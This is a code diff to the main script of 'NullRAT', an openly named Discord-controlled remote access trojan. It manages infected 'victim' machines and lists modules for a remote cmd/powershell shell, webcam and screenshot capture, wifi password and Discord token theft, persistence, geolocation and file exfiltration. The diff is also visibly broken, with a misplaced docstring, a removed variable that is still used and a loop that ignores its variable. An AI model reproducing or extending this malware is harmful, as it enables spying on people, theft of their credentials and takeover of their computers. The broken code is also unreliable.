@@ -71,16 +71,16 @@ def find_token(self):
 ###################################################################
 
 original_dir = os.getcwd()
-nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
-ip_addr = os.getenv("username") + str(random.randint(8000))
+if "dmin" in os.getenv("username"):
+    identifier = IP()
+else:
+    identifier = os.getenv("username") 
 
 class NullBot(commands.InteractionBot):
     def __init__(self, **options):
         super().__init__(**options)
         self.ip_addr = ip_addr
-        self.nr_working = nr_working
         self.original_dir = original_dir
-        self.victim = discord.Option("victim", description="Type the identifier of the victim here", required=True)
     
     genEmbed = genEmbed
     checked_embeds = checked_embeds
@@ -96,12 +96,12 @@ if os.path.isdir(nr_working) != True:
 @client.event
 async def on_ready():
     embed = Embed(
-        title = f"NullRAT v8.4 started on: **{ip_addr}**", 
+        title = f"NullRAT **IX** started on: **{identifier}**", 
         description = f"Currently present in:\n```{original_dir}```",
         timestamp = datetime.now()
     ).set_author(
         name="NullCode1337", 
-        url=r"http://nullcode1337.42web.io/", 
+        url=r"http://null337.rf.gd/", 
         icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
     ).set_footer(
         text = f"Startup time:"
@@ -110,26 +110,33 @@ async def on_ready():
 
 ############### Basic commands 
 
-@client.slash_command(description="Finds the values of environment variables" )
+@client.slash_command()
 async def listvictims(ctx):
+    """Lists all victim identifiers accessible by NullRAT"""
     await ctx.channel.send( 
-        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {ip_addr}") 
+        embed=discord.Embed(title=f"The identifier for {os.getenv('username')} is: {ip_addr}") 
     )
-    await ctx.response.send_message("Checking all available victims...")
+    await ctx.response.send_message("__Checked all available victims:__")
 
-@client.slash_command(
-    description="Quits NullRAT from specified IP",
-    options = [
-        discord.Option("")
-    ])
+@client.slash_command()
 async def close(ctx, victim):
-    if str(victim) == str(ip_addr):
-        await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
+    """Shuts down a specific instance of NullRAT.
+    
+    Parameters
+    ----------
+    victim: Identifier of the affected computer (found via /listvictims)
+    """
+    if str(victim) == str(identifier):
+        await ctx.response.send_message(
+            embed = client.genEmbed(
+                "Closing NullRAT for machine " + identifier,
+                datetime.now()
+            )
+        )
         await client.close()
-    if "." not in ip:
-        return await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is incorrect!", "Please try again"))  
         
 @client.slash_command(description="Quits all instances of NullRAT")
+    """Shuts down all instances of NullRAT"""
 async def close_all(ctx):
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
     
@@ -141,7 +148,7 @@ class closeall_confirm(discord.ui.View):
         for child in self.children:
             child.disabled = True
         await interaction.response.edit_message(view=self) 
-        await interaction.channel.send(embed=Embed(title="Closing all instances of NullRAT...")) 
+        await interaction.channel.send(embed=Embed(title="Shutting down all instances of NullRAT...")) 
         await client.close()
         
     @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
@@ -154,24 +161,11 @@ class closeall_confirm(discord.ui.View):
 ############### Bot Extensions
 
 extensions = (
-    "hide",           # /hidefile & /unhidefile
-    "wifi",           # /wifilist & /wifipass
-    "shell",          # /cmd & /powershell
-    "getenv",         # /get_environment
-    "webcam",         # /get_webcam
-    "startup",        # /startup
-    "geolocate",      # /get_geolocation
-    "directory",      # /get_currentdir & /change_directory & /list_directory
-    "rawtokens",      # /raw_tokens & /raw_discord
-    "sendfiles",      # /sendfiles
-    "systeminfo",     # /get_systeminfo
-    "screenshot",     # /get_screenshot
-    "receivefiles",   # /receivefiles
-    "checkedtokens"   # /checked_tokens & /checked_discord
+    "Aa"
 )
 
 for ex in extensions:
-    client.load_extension("modules."+ex)
+    client.load_extension("modules."+"receivefiles")
 
 ############### Bot Startup
 def is_connected():
@@ -181,3 +175,18 @@ def is_connected():
 while is_connected() == False: 0
 client.run(bot_token)
 ############### Bot Startup
+
+    # "hide",           # /hidefile & /unhidefile
+    # "wifi",           # /wifilist & /wifipass
+    # "shell",          # /cmd & /powershell
+    # "getenv",         # /get_environment
+    # "webcam",         # /get_webcam
+    # "startup",        # /startup
+    # "geolocate",      # /get_geolocation
+    # "directory",      # /get_currentdir & /change_directory & /list_directory
+    # "rawtokens",      # /raw_tokens & /raw_discord
+    # "sendfiles",      # /sendfiles
+    # "systeminfo",     # /get_systeminfo
+    # "screenshot",     # /get_screenshot
+    # "receivefiles",   # /receivefiles
+    # "checkedtokens"   # /checked_tokens & /checked_discord
